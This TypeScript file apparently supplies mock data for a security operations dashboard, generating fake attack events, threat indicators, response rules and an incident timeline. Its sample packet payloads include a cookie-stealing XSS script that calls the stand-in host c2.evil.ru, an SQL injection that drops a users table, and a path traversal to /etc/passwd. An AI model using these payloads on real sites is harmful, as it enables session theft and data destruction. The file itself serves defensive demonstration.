// ============================================================
// Rudra SOC — Mock data + live event generator
// Simulates the real-time pipeline from the Rust engine
// ============================================================

import type {
  AttackEvent, SystemStats, SecurityScore, ThreatIntelItem,
  AutoRule, ForensicPacket, AiAnalysis, IncidentTimelineEvent,
  NetworkNode, NetworkEdge, ThreatLevel, AttackType,
} from '@/types'

// ── Helpers ──────────────────────────────────────────────────
let _id = 1
export function uid() { return `ev-${Date.now()}-${_id++}` }

function rand(min: number, max: number) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}
function pick<T>(arr: T[]): T { return arr[rand(0, arr.length - 1)] }

const GEO_POOL: Array<{ country: string; lat: number; lng: number }> = [
  { country: 'Russia',       lat: 55.75, lng: 37.62 },
  { country: 'China',        lat: 39.90, lng: 116.40 },
  { country: 'Brazil',       lat: -15.78, lng: -47.93 },
  { country: 'USA',          lat: 37.77, lng: -122.42 },
  { country: 'Germany',      lat: 52.52, lng: 13.40 },
  { country: 'India',        lat: 20.59, lng: 78.96 },
  { country: 'France',       lat: 48.86, lng: 2.35 },
  { country: 'UK',           lat: 51.51, lng: -0.13 },
  { country: 'Iran',         lat: 35.69, lng: 51.39 },
  { country: 'North Korea',  lat: 39.03, lng: 125.75 },
  { country: 'Netherlands',  lat: 52.37, lng: 4.90 },
  { country: 'Romania',      lat: 44.43, lng: 26.10 },
]

const ATTACK_TYPES: AttackType[] = [
  'SQL Injection', 'XSS', 'DDoS', 'Port Scan', 'Brute Force',
  'Malware C2', 'Ransomware', 'DNS Tunnel', 'QUIC Abuse',
  'ARP Spoof', 'Path Traversal', 'RCE', 'SSRF', 'Botnet', 'Zero-Day',
]

const MITRE_MAP: Record<AttackType, string> = {
  'SQL Injection':  'T1190',
  'XSS':            'T1059.007',
  'DDoS':           'T1498',
  'Port Scan':      'T1046',
  'Brute Force':    'T1110',
  'Malware C2':     'T1071',
  'Ransomware':     'T1486',
  'DNS Tunnel':     'T1071.004',
  'QUIC Abuse':     'T1071.001',
  'ARP Spoof':      'T1557.002',
  'Path Traversal': 'T1083',
  'RCE':            'T1203',
  'SSRF':           'T1090',
  'Botnet':         'T1583.003',
  'Zero-Day':       'T1203',
}

function severityForType(t: AttackType): ThreatLevel {
  if (['RCE','Ransomware','Zero-Day','Malware C2'].includes(t)) return 'critical'
  if (['SQL Injection','Brute Force','Botnet','SSRF'].includes(t)) return 'high'
  if (['DDoS','DNS Tunnel','QUIC Abuse','ARP Spoof'].includes(t)) return 'medium'
  if (['Port Scan','XSS','Path Traversal'].includes(t)) return 'low'
  return 'info'
}

function randomIp(prefix?: string) {
  if (prefix) return `${prefix}.${rand(1,254)}.${rand(1,254)}`
  return `${rand(1,254)}.${rand(1,254)}.${rand(1,254)}.${rand(1,254)}`
}

export function generateAttackEvent(): AttackEvent {
  const src = pick(GEO_POOL)
  const destinations = GEO_POOL.filter(g => g.country !== src.country)
  const dst = pick(destinations)
  const attackType = pick(ATTACK_TYPES)
  return {
    id:          uid(),
    timestamp:   new Date(),
    srcIp:       randomIp(),
    srcCountry:  src.country,
    srcLat:      src.lat + (Math.random() - 0.5) * 4,
    srcLng:      src.lng + (Math.random() - 0.5) * 4,
    dstIp:       randomIp('10.0'),
    dstCountry:  dst.country,
    dstLat:      dst.lat,
    dstLng:      dst.lng,
    attackType,
    severity:    severityForType(attackType),
    status:      Math.random() > 0.2 ? 'BLOCKED' : 'DETECTED',
    protocol:    pick(['TCP','UDP','HTTP','HTTPS','DNS','QUIC']),
    port:        pick([80,443,22,21,3306,8080,53,25,445]),
    payload:     attackType === 'SQL Injection' ? "' OR '1'='1'; --" : undefined,
    mlConfidence: parseFloat(((70 + Math.random() * 28) / 100).toFixed(2)),
    ruleId:      `R-${rand(1000,9999)}`,
    mitre:       MITRE_MAP[attackType],
  }
}

// ── Static seed data ─────────────────────────────────────────
export const INITIAL_EVENTS: AttackEvent[] = Array.from({ length: 40 }, generateAttackEvent).map(
  (e,i) => ({ ...e, timestamp: new Date(Date.now() - (40-i) * 12000) })
)

export const SYSTEM_STATS: SystemStats = {
  packetsPerSec:    28_413,
  blockedToday:     14_882,
  activeConnections:3_291,
  threatsDetected:  247,
  engineStatus:     'online',
  uptime:           864_000,
  cpuUsage:         34,
  memUsage:         51,
}

export const SECURITY_SCORE: SecurityScore = {
  overall:         92,
  idsScore:        95,
  ipsScore:        91,
  mlScore:         88,
  complianceScore: 94,
  threatIntelScore:93,
}

export const THREAT_INTEL_ITEMS: ThreatIntelItem[] = [
  { id:'ti-1', indicator:'185.220.101.32',    type:'ip',     campaign:'APT29',        lastSeen:'2 min ago',  hits:142, risk:'critical' },
  { id:'ti-2', indicator:'45.142.212.18',     type:'ip',     campaign:'Anonymous',    lastSeen:'14 min ago', hits:38,  risk:'high'     },
  { id:'ti-3', indicator:'91.108.56.112',     type:'ip',     campaign:'Masscan',      lastSeen:'1 h ago',    hits:12,  risk:'medium'   },
  { id:'ti-4', indicator:'114.119.145.38',    type:'ip',     campaign:'APT41',        lastSeen:'3 h ago',    hits:87,  risk:'critical' },
  { id:'ti-5', indicator:'evildomain.ru',     type:'domain', campaign:'Emotet',       lastSeen:'8 h ago',    hits:23,  risk:'high'     },
  { id:'ti-6', indicator:'195.78.54.40',      type:'ip',     campaign:'Brute Force',  lastSeen:'12 h ago',   hits:9,   risk:'low'      },
]

export const AUTO_RULES: AutoRule[] = [
  { id:'ar-1', name:'Block Brute Force',    description:'Auto-block IPs with >20 failed auth', condition:'brute_force AND attempts > 20', action:'auto_block_ip',     enabled:true,  triggerCount: 842, priority:'high'   },
  { id:'ar-2', name:'Isolate Malware',      description:'Network-isolate infected hosts',       condition:'malware_c2 detected',           action:'isolate_device',    enabled:true,  triggerCount: 23,  priority:'high'   },
  { id:'ar-3', name:'Rate-Limit DDoS',      description:'Throttle sources exceeding packet rate',condition:'pps > 50000',                   action:'rate_limit_source', enabled:true,  triggerCount: 106, priority:'medium' },
  { id:'ar-4', name:'Honeypot Deploy',      description:'Lure stealthy port-scanners',          condition:'port_scan AND stealth=true',    action:'deploy_honeypot',   enabled:false, triggerCount: 9,   priority:'low'    },
  { id:'ar-5', name:'Forensic Capture',     description:'Capture packets for critical threats',  condition:'severity = critical',           action:'start_capture',     enabled:true,  triggerCount: 31,  priority:'high'   },
]

const PAYLOADS = [
  "GET /admin/../etc/passwd HTTP/1.1",
  "' OR '1'='1'; DROP TABLE users; --",
  "<script>document.location='http://c2.evil.ru/steal?c='+document.cookie</script>",
  "EHLO mx.evil.com\r\nMAIL FROM:<spam@evil.com>",
  "\\x90\\x90\\x90\\x90\\xcc (NOP sled + INT3)",
  "User-Agent: Masscan/1.3 (scan detected)",
]
export const FORENSIC_PACKETS: ForensicPacket[] = Array.from({ length: 20 }, (_, i) => ({
  id:        `pkt-${i+1}`,
  timestamp: new Date(Date.now() - i * 2000).toISOString(),
  srcIp:     randomIp(),
  dstIp:     randomIp('10.0'),
  protocol:  pick(['TCP','UDP','HTTP','DNS']),
  length:    rand(60, 1500),
  payload:   pick(PAYLOADS),
  threat:    i < 8 ? (pick(ATTACK_TYPES) as string) : undefined,
  flagged:   i < 8,
  ttl:       rand(32, 128),
}))

export const AI_ANALYSIS: AiAnalysis = {
  threatName:       'Coordinated Botnet Campaign — APT29',
  confidence:       94,
  iocMatches:       37,
  behaviorScore:    88,
  affectedHosts:    3,
  campaignAge:      '14d',
  summary:          'Multi-vector attack combining DDoS amplification with C2 beacon traffic. Consistent with COZY BEAR TTPs. High confidence lateral movement observed on internal subnets.',
  actors:           ['APT29', 'COZY BEAR'],
  recommendations:  [
    'Block ASN 200305 (known botnet hosting provider)',
    'Enable adaptive rate limiting on external port 443',
    'Deploy honeypot on subnet 10.0.2.0/24 to track pivot attempts',
    'Increase IDS sensitivity — enable Rule R-4412 (beacon detection)',
    'Alert IR team — potential nation-state level intrusion in progress',
  ],
  mitreTechniques: [
    { id:'T1498',     name:'Network Denial of Service',    tactic:'Impact' },
    { id:'T1071.001', name:'Web Protocols C2',             tactic:'C&C' },
    { id:'T1021.002', name:'SMB/Windows Admin Shares',     tactic:'Lateral Movement' },
    { id:'T1110',     name:'Brute Force',                  tactic:'Credential Access' },
    { id:'T1071.004', name:'DNS Application Layer Protocol',tactic:'C&C' },
  ],
}

export const INCIDENT_TIMELINE: IncidentTimelineEvent[] = [
  { id:'t1', timestamp: new Date(Date.now()-300000).toISOString(), type:'detection',  title:'Port Scan Detected',          description:'185.220.101.32 (Russia) scanning ports 22,80,443,3389',  severity:'low'      },
  { id:'t2', timestamp: new Date(Date.now()-240000).toISOString(), type:'alert',      title:'Brute Force SSH',             description:'32 auth failures in 60s — threshold exceeded',            severity:'high'     },
  { id:'t3', timestamp: new Date(Date.now()-180000).toISOString(), type:'block',      title:'Auto-Block Triggered',        description:'IP 185.220.101.32 blocked by rule AR-1',                  severity:'high'     },
  { id:'t4', timestamp: new Date(Date.now()-120000).toISOString(), type:'escalation', title:'Malware C2 Communication',    description:'ML confidence 94% — beacon to evildomain.ru',            severity:'critical' },
  { id:'t5', timestamp: new Date(Date.now()-60000).toISOString(),  type:'mitigation', title:'Forensic Capture Started',    description:'Packet capture on 10.0.0.45 via RASP engine',            severity:'critical' },
  { id:'t6', timestamp: new Date(Date.now()-20000).toISOString(),  type:'info',       title:'Threat Contained',            description:'IOC added to global block list. Monitoring continues.',  severity:'info'     },
]

// ── 24h chart data ────────────────────────────────────────────
export const HOURLY_STATS = Array.from({ length: 24 }, (_, i) => ({
  hour:    `${String(i).padStart(2,'0')}:00`,
  blocked: rand(200, 1800),
  allowed: rand(2000, 12000),
  threats: rand(5, 120),
}))

// ── Network topology ──────────────────────────────────────────
export const NETWORK_NODES: NetworkNode[] = [
  { id:'internet', label:'Internet',      type:'internet',  status:'normal' },
  { id:'router',   label:'Edge Router',   type:'router',    ip:'203.0.113.1', status:'normal' },
  { id:'rudra',    label:'Rudra Firewall',type:'firewall',  ip:'10.0.0.1',    status:'normal' },
  { id:'web1',     label:'Web Server',    type:'server',    ip:'10.0.0.10',   status:'warning' },
  { id:'db1',      label:'Database',      type:'server',    ip:'10.0.0.20',   status:'normal' },
  { id:'ad',       label:'AD Server',     type:'server',    ip:'10.0.0.30',   status:'normal' },
  { id:'client1',  label:'Workstation A', type:'client',    ip:'10.0.1.10',   status:'normal' },
  { id:'client2',  label:'Workstation B', type:'client',    ip:'10.0.1.11',   status:'danger' },
  { id:'iot1',     label:'IoT Device',    type:'iot',       ip:'10.0.2.50',   status:'warning' },
]

export const NETWORK_EDGES: NetworkEdge[] = [
  { source:'internet', target:'router',  active:true, attack:false },
  { source:'router',   target:'rudra',   active:true, attack:false },
  { source:'rudra',    target:'web1',    active:true, attack:false },
  { source:'rudra',    target:'db1',     active:true, attack:false },
  { source:'rudra',    target:'ad',      active:true, attack:false },
  { source:'rudra',    target:'client1', active:true, attack:false },
  { source:'rudra',    target:'client2', active:true, attack:true  },
  { source:'rudra',    target:'iot1',    active:true, attack:false },
]
